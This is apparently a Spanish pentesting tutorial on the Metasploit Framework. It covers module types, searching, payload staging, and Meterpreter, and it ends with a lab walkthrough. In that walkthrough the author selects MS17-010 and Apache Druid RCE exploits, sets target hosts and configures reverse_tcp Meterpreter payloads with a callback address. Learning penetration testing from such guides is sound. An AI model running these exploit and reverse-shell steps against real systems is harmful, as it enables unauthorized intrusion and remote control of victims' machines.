---
title: Metasploit Framework
date: 2025-01-28 14:00:00 -0000
categories: [Hacking, Metasploit]
tags: [Metasploit, Exploits, MSF, Meterpreter, Post Exploitation, Linux, Windows, Privilege Escalation, Linux Privilege Escalation, Windows Privilege Escalation, Windows Post Exploitation, Linux Post Exploitation, Metasploit Framework, MSF Framework, Meterpreter Framework, Post Exploitation Framework, Linux Post Exploitation Framework, Windows Post Exploitation Framework]
image:
  path: /assets/img/posts/metasploit/cabecera.jpeg
  alt: Metasploit
description: >
  Guía de uso y comandos de Metasploit
pin: false  
toc: true   
math: false 
mermaid: false 
---

# Conociendo Metasploit

El Proyecto Metasploit es una plataforma de pruebas de penetración que está desarrollada en Ruby y tiene una estructura modular. Esta herramienta te permite escribir, probar y ejecutar código de exploits (códigos que aprovechan vulnerabilidades). Estos exploits pueden ser creados por el propio usuario o pueden obtenerse de una base de datos que contiene los últimos exploits descubiertos y ya adaptados en módulos.

El Marco de trabajo Metasploit (Metasploit Framework) incluye un conjunto de herramientas que puedes utilizar para:
- Probar vulnerabilidades de seguridad
- Enumerar redes
- Ejecutar ataques
- Evadir la detección

Metasploit es un proyecto de código abierto y es gratuito para usar pero tiene un framework "Pro" en el que se requiere una licencia paga para su uso comercial.

### Modulos de Metasploit

Los módulos de Metasploit son los componentes que hacen funcionar Metasploit. Cada módulo tiene una función específica que se ejecuta cuando se ejecuta el comando "msfconsole". Los módulos se pueden cargar y descargar desde el framework de Metasploit.

```bash
pr0ff3@htb[/htb]$ ls /usr/share/metasploit-framework/modules

auxiliary  encoders  evasion  exploits  nops  payloads  post
```

### Plugins

Los plugins ofrecen al pentester una mayor flexibilidad cuando usa la consola de Metasploit. Esto es porque estos plugins pueden cargarse de forma manual o automática según se necesiten, proporcionando funcionalidades adicionales y automatización durante la evaluación de seguridad.

```bash
pr0ff3@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/

aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb
alias.rb           komand.rb      pcap_log.rb          sqlmap.rb
auto_add_route.rb  lab.rb         request.rb           thread.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb
db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
```
### Scripts 

Son las funcionalidades que utiliza el meterpreter y otros scripts.

```bash
pr0ff3@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/

meterpreter  ps  resource  shell
```

### Tools

Utilidades de la línea de comandos que proporcionan funcionalidades adicionales que pueden ser llamadas desde el menú de msfconsole.

```bash
pr0ff3@htb[/htb]$ ls /usr/share/metasploit-framework/tools/

context  docs     hardware  modules   payloads
dev      exploit  memdump   password  recon
```

[Ver Cheatsheet MSF](/assets/img/posts/metasploit/cheat_sheet.pdf)



## Instalación de Metasploit

Para instalar Metasploit, debes descargar el paquete de instalación desde el sitio web oficial de Metasploit o en algunas distribuciones de Linux como Kali o Parrot
suele venir pre instalado o simplemnte en sus repositorios de software por lo que es sencillamente instalar con el administrador de paquetes.

```bash
sudo apt install metasploit-framework
```
Para iniciar
```bash 
msfconsole 
```

Para actualizar los modulos y contendio de msfconsole
```bash 
sudo apt update && sudo apt install metasploit-framework
```

Uno de los primeros pasos es buscar un `exploit` adecuado para nuestro `objetivo`. Sin embargo, necesitamos tener una perspectiva detallada del `objetivo` en sí antes de intentar cualquier explotación. Esto implica el proceso de `Enumeración`, que precede a cualquier intento de explotación.

Durante la `Enumeración`, tenemos que examinar nuestro objetivo e identificar qué servicios orientados al público se están ejecutando en él. Por ejemplo, ¿es un servidor HTTP? ¿Es un servidor FTP? ¿Es una base de datos SQL? Estas diferentes tipologías de `objetivos` varían sustancialmente. Necesitaremos comenzar con un `escaneo` exhaustivo de la dirección IP del objetivo para determinar qué servicio se está ejecutando y qué versión está instalada para cada servicio.

Notaremos a medida que avanzamos que las versiones son los componentes clave durante el proceso de `Enumeración` que nos permitirán determinar si el objetivo es vulnerable o no. Las versiones sin parchear de servicios previamente vulnerables o el código desactualizado en una plataforma de acceso público a menudo serán nuestro punto de entrada en el sistema `objetivo`.

# Componentes de Metasploit

## Módulos

Los `módulos` de Metasploit son scripts preparados con un propósito específico y funciones correspondientes que ya han sido desarrolladas y probadas en el campo. La categoría `exploit` consiste en las llamadas pruebas de concepto (`POCs`) que pueden usarse para explotar vulnerabilidades existentes de manera ampliamente automatizada. Muchas personas a menudo piensan que el fallo del exploit demuestra la inexistencia de la vulnerabilidad sospechada. Sin embargo, esto solo es prueba de que el exploit de Metasploit no funciona y no de que la vulnerabilidad no exista. Esto se debe a que muchos exploits requieren personalización según los hosts objetivo para hacer que el exploit funcione. Por lo tanto, las herramientas automatizadas como el framework de Metasploit solo deben considerarse una herramienta de apoyo y no un sustituto de nuestras habilidades manuales.

Una vez que estamos en la `msfconsole`, podemos seleccionar de una extensa lista que contiene todos los módulos disponibles de Metasploit. Cada uno de ellos está estructurado en carpetas, que se verán así:

> Sintaxis
{: .prompt-info }

`<No.> <type>/<os>/<service>/<name>`

**Número de Índice**
La etiqueta `No.` se mostrará para seleccionar el exploit que queramos después durante nuestras búsquedas. Veremos más adelante lo útil que puede ser la etiqueta `No.` para seleccionar módulos específicos de Metasploit.

**Tipo**
La etiqueta `Type` es el primer nivel de segregación entre los `módulos` de Metasploit. Mirando este campo, podemos saber qué logrará el fragmento de código de este módulo. Algunos de estos `tipos` no son directamente utilizables como lo sería un módulo `exploit`, por ejemplo. Sin embargo, están configurados para introducir la estructura junto con los interactivos para una mejor modularización. Para explicar mejor, aquí están los posibles tipos que podrían aparecer en este campo:

**Descripción del Tipo**
`Auxiliary` Capacidades de escaneo, fuzzing, sniffing y administración. Ofrecen asistencia y funcionalidad extra.
`Encoders` Aseguran que los payloads lleguen intactos a su destino.
`Exploits` Definidos como módulos que explotan una vulnerabilidad que permitirá la entrega del payload.
`NOPs` (Código de No Operación) Mantienen los tamaños de payload consistentes a través de los intentos de explotación.
`Payloads` Código que se ejecuta remotamente y hace callback a la máquina del atacante para establecer una conexión (o shell).
`Plugins` Scripts adicionales que pueden integrarse dentro de una evaluación con `msfconsole` y coexistir.
`Post` Amplia variedad de módulos para recopilar información, profundizar en el pivoteo, etc.

Ten en cuenta que al seleccionar un módulo para usar en la entrega de payload, el comando `use <no.>` solo puede usarse con los siguientes módulos que pueden usarse como `iniciadores` (o módulos interactivos):

**Descripción del Tipo**
`Auxiliary` Capacidades de escaneo, fuzzing, sniffing y administración. Ofrecen asistencia y funcionalidad extra.
`Exploits` Definidos como módulos que explotan una vulnerabilidad que permitirá la entrega del payload.
`Post` Amplia variedad de módulos para recopilar información, profundizar en el pivoteo, etc.

**Sistema Operativo**
La etiqueta `OS` especifica para qué sistema operativo y arquitectura fue creado el módulo. Naturalmente, diferentes sistemas operativos requieren que se ejecute diferente código para obtener los resultados deseados.

**Servicio**
La etiqueta `Service` se refiere al servicio vulnerable que se está ejecutando en la máquina objetivo. Para algunos módulos, como los `auxiliary` o `post`, esta etiqueta puede referirse a una actividad más general como `gather`, refiriéndose a la recopilación de credenciales, por ejemplo.

**Nombre**
Finalmente, la etiqueta `Name` explica la acción real que se puede realizar usando este módulo creado para un propósito específico.

### Buscar módulos

Para buscar un módulo en Metasploit, puedes utilizar la herramienta de búsqueda de módulos. 

```bash
msf6 > help search

Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.

OPTIONS:
  -h                   Show this help information
  -o <file>            Send output to a file in csv format
  -S <string>          Regex pattern used to filter search results
  -u                   Use module if there is one result
  -s <search_column>   Sort the research results based on <search_column> in ascending order
  -r                   Reverse the search results order to descending order

Keywords:
  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  cve              :  Modules with a matching CVE ID
  edb              :  Modules with a matching Exploit-DB ID
  check            :  Modules that support the 'check' method
  date             :  Modules with a matching disclosure date
  description      :  Modules with a matching description
  fullname         :  Modules with a matching full name
  mod_time         :  Modules with a matching modification date
  name             :  Modules with a matching descriptive name
  path             :  Modules with a matching path
  platform         :  Modules affecting this platform
  port             :  Modules with a matching port
  rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref              :  Modules with a matching ref
  reference        :  Modules with a matching reference
  target           :  Modules affecting this target
  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

Supported search columns:
  rank             :  Sort modules by their exploitabilty rank
  date             :  Sort modules by their disclosure date. Alias for disclosure_date
  disclosure_date  :  Sort modules by their disclosure date
  name             :  Sort modules by their name
  type             :  Sort modules by their type
  check            :  Sort modules by whether or not they have a check method

Examples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```
También podemos hacer nuestra búsqueda un poco más general y reducirla a una categoría de servicios. Por ejemplo, para el CVE, podríamos especificar el año (`cve:<año>`), la plataforma Windows (`platform:<sistema_operativo>`), el tipo de módulo que queremos encontrar (`type:<auxiliary/exploit/post>`), el rango de fiabilidad (`rank:<rango>`), y el nombre de búsqueda (`<patrón>`). Esto reduciría nuestros resultados solo a aquellos que coincidan con todos los criterios anteriores.

```bash
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE
```

### Usar módulos

Dentro de los módulos interactivos, hay varias opciones que podemos especificar. Estas se utilizan para adaptar el módulo de Metasploit al entorno dado. Porque en la mayoría de los casos, siempre necesitamos escanear o atacar diferentes direcciones IP. Por lo tanto, requerimos este tipo de funcionalidad para permitirnos establecer nuestros objetivos y ajustarlos con precisión. Para verificar qué opciones necesitan establecerse antes de que el exploit pueda enviarse al host objetivo, podemos usar el comando `show options`. Todo lo que se requiera establecer antes de que pueda ocurrir la explotación tendrá un `Yes` bajo la columna `Required`.

```bash 
Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   
   
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec): 

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
Aquí vemos lo útiles que pueden ser las etiquetas `No.`. Porque ahora, no tenemos que escribir toda la ruta sino solo el número asignado al módulo de Metasploit en nuestra búsqueda. Podemos usar el comando `info` después de seleccionar el módulo si queremos saber algo más sobre el módulo. Esto nos dará una serie de información que puede ser importante para nosotros.

### Información del módulo

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > info

       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14

Provided by:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   PowerShell
  2   Native upload
  3   MOF upload

Check supported:
  Yes

Basic options:
  Name                  Current Setting                          Required  Description
  ----                  ---------------                          --------  -----------
  DBGTRACE              false                                    yes       Show extra debug trace info
  LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
  NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
  NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                        rdlists/named_pipes.txt
  RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                                                           wiki/Using-Metasploit
  RPORT                 445                                      yes       The Target port (TCP)
  SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
  SERVICE_DISPLAY_NAME                                           no        The service display name
  SERVICE_NAME                                                   no        The service name
  SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor
                                                                           mal read/write folder share
  SMBDomain             .                                        no        The Windows domain to use for authentication
  SMBPass                                                        no        The password for the specified username
  SMBUser                                                        no        The username to authenticate as

Payload information:
  Space: 3072

Description:
  This module will exploit SMB with vulnerabilities in MS17-010 to 
  achieve a write-what-where primitive. This will then be used to 
  overwrite the connection session information with as an 
  Administrator session. From there, the normal psexec payload code 
  execution is done. Exploits a type confusion between Transaction and 
  WriteAndX requests and a race condition in Transaction requests, as 
  seen in the EternalRomance, EternalChampion, and EternalSynergy 
  exploits. This exploit chain is more reliable than the EternalBlue 
  exploit, but requires a named pipe.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://github.com/worawit/MS17-010
  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/

Also known as:
  ETERNALSYNERGY
  ETERNALROMANCE
  ETERNALCHAMPION
  ETERNALBLUE
```

### Especificación de objetivo

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
```
Además, existe la opción `setg`, que especifica las opciones seleccionadas por nosotros como permanentes hasta que se reinicie el programa. Por lo tanto, si estamos trabajando en un host objetivo particular, podemos usar este comando para establecer la dirección IP una vez y no cambiarla de nuevo hasta que cambiemos nuestro enfoque a una dirección IP diferente.

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
```
### Ejecución

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

## Targets u objetivos

Los `Targets` son identificadores únicos de sistemas operativos tomados de las versiones de esos sistemas operativos específicos que adaptan el módulo de exploit seleccionado para ejecutarse en esa versión particular del sistema operativo. El comando `show targets` emitido dentro de la vista de un módulo de exploit mostrará todos los objetivos vulnerables disponibles para ese exploit específico, mientras que emitir el mismo comando en el menú raíz, fuera de cualquier módulo de exploit seleccionado, nos hará saber que necesitamos seleccionar un módulo de exploit primero.

Por ejemplo suponemos que tenemos un exploit en mente pero queremos saber a que versiones afecta.
Una vez seleccionado el exploit podemos realizar el siguiente comando y seleccionar el objetivo:

```bash
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7


msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6

target => 6
```
Hay una gran variedad de tipos de objetivos. Cada objetivo puede variar de otro por el service pack, versión del sistema operativo, e incluso versión de idioma. Todo depende de la dirección de retorno y otros parámetros en el objetivo o dentro del módulo de exploit.

## Payloads

Un `Payload` en Metasploit se refiere a un módulo que ayuda al módulo de exploit (típicamente) a devolver una shell al atacante. Los payloads se envían junto con el exploit en sí para eludir los procedimientos de funcionamiento estándar del servicio vulnerable (`trabajo del exploit`) y luego se ejecutan en el sistema operativo objetivo para típicamente devolver una conexión inversa al atacante y establecer un punto de apoyo (`trabajo del payload`).

Hay tres tipos diferentes de módulos de payload en el Framework de Metasploit: Singles (Únicos), Stagers (Preparadores) y Stages (Etapas). El uso de tres tipologías de interacción de payload resultará beneficioso para el pentester. Puede ofrecer la flexibilidad que necesitamos para realizar ciertos tipos de tareas. La presencia o ausencia de etapas en un payload se representa mediante `/` en el nombre del payload.

Por ejemplo, `windows/shell_bind_tcp` es un payload único sin etapa, mientras que `windows/shell/bind_tcp` consiste en un stager (`bind_tcp`) y una stage (`shell`).

**Singles**
Un payload `Single` contiene el exploit y todo el shellcode para la tarea seleccionada. Los payloads en línea son por diseño más estables que sus contrapartes porque contienen todo en uno. Sin embargo, algunos exploits no soportarán el tamaño resultante de estos payloads ya que pueden volverse bastante grandes. Los `Singles` son payloads autónomos. Son el único objeto enviado y ejecutado en el sistema objetivo, dándonos un resultado inmediatamente después de ejecutarse. Un payload Single puede ser tan simple como agregar un usuario al sistema objetivo o iniciar un proceso.

**Stagers**
Los payloads `Stager` trabajan con payloads Stage para realizar una tarea específica. Un Stager está esperando en la máquina del atacante, listo para establecer una conexión con el host víctima una vez que la stage complete su ejecución en el host remoto. Los `Stagers` se utilizan típicamente para establecer una conexión de red entre el atacante y la víctima y están diseñados para ser pequeños y confiables. Metasploit usará el mejor y recurrirá a uno menos preferido cuando sea necesario.

**Stages**
Las `Stages` son componentes de payload que son descargados por los módulos stager. Las diferentes Stages de payload proporcionan características avanzadas sin límites de tamaño, como Meterpreter, Inyección VNC y otros. Las stages de payload utilizan automáticamente stagers intermedios:
* Un solo `recv()` falla con payloads grandes
* El Stager recibe el stager intermedio
* El stager intermedio luego realiza una descarga completa
* También mejor para RWX

### Stage payloads

`Stage0` de una carga útil por etapas representa el shellcode inicial enviado a través de la red al servicio vulnerable de la máquina objetivo, que tiene el único propósito de inicializar una conexión de vuelta a la máquina del atacante. Esto es lo que se conoce como una conexión inversa. Como usuario de Metasploit, nos encontraremos con estos bajo los nombres comunes `reverse_tcp`, `reverse_https`, y `bind_tcp`. Por ejemplo, bajo el comando `show payloads`, puedes buscar las cargas útiles que se ven como las siguientes:

```bash 
msf6 > show payloads

535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
```

### Meterpreter payloads

El `Meterpreter` es un tipo específico de carga útil que utiliza la `inyección de DLL` para asegurar que la conexión al host víctima sea estable, difícil de detectar mediante comprobaciones simples y persistente a través de reinicios o cambios del sistema. Meterpreter reside completamente en la memoria del host remoto y no deja rastros en el disco duro, lo que hace que sea muy difícil de detectar con técnicas forenses convencionales. Además, los scripts y plugins pueden ser `cargados y descargados` dinámicamente según se requiera.

```bash
msf6 > show payloads

Payloads
========

   #    Name                                                Disclosure Date  Rank    Check  Description
-    ----                                                ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline
   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline
   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd
   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline
   4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager
   5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager
   6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager
   7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline
   8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline
   9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline
   10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager
   11   android/shell/reverse_https                                          manual  No     Command Shell, Android Reverse HTTPS Stager
   12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager
   13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline
   
<SNIP>
   
   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
   558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
   560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
   561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
```

### Buscar payloads especificos

Como la cantidad de payloads puede ser abrumadore es posible añadir un grep para buscar en el nombre de los payloads.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads

   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
```

### Seleccionar payload especifico

Una vez tengamos el payload que queremos utilizar, podemos seleccionarlo en Metasploit e intercambiarlo con el que por defecto puede traer un exploit.

Para ello simplemente una vez seleccionado el exploit, podemos utilizar el comando `set payload` para seleccionar el payload que queremos utilizar.

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set payload windows/x64/meterpreter/reverse_tcp
```

## Meterpreter

El `Meterpreter` es un framework de código abierto que permite a los usuarios interactuar con un sistema operativo remoto con comandos universales independientemente del sistema objetivo, es decir que los comandos de `Meterpreter` pueden ser utilizados en cualquier sistema operativo.

### Meterpreter comandos

```bash
meterpreter > help
```
Meterpreter está basado en comandos nativos de la shell de comandos Linux. Estos comandos son similares a los comandos de Bash, pero con algunas diferencias.

Por ejemplo si queremos iniciar una shell nativa en el sistema remoto podemos utilizar el comando `shell`.

[Ver Cheatsheet Meterpreter](/assets/img/posts/metasploit/cheat_sheet.pdf)

#### Ejemplo práctico

```bash
msf6 > search Apache Druid

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/linux/http/apache_druid_js_rce          2021-01-21       excellent  Yes    Apache Druid 0.20.0 Remote Command Execution
   1    \_ target: Linux (dropper)                    .                .          .      .
   2    \_ target: Unix (in-memory)                   .                .          .      .
   3  exploit/multi/http/apache_druid_cve_2023_25194  2023-02-07       excellent  Yes    Apache Druid JNDI Injection RCE
   4    \_ target: Automatic                          .                .          .      .
   5    \_ target: Windows                            .                .          .      .
   6    \_ target: Linux                              .                .          .      .
   7  auxiliary/scanner/http/log4shell_scanner        2021-12-09       normal     No     Log4Shell HTTP Scanner
   8    \_ AKA: Log4Shell                             .                .          .      .
   9    \_ AKA: LogJam                                .                .          .      .


Interact with a module by name or index. For example info 9, use 9 or use auxiliary/scanner/http/log4shell_scanner

msf6 > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/apache_druid_js_rce) > options

Module options (exploit/linux/http/apache_druid_js_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      8888             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path of Apache Druid
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux (dropper)



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/apache_druid_js_rce) > set LHOST 10.10.14.185
LHOST => 10.10.14.185
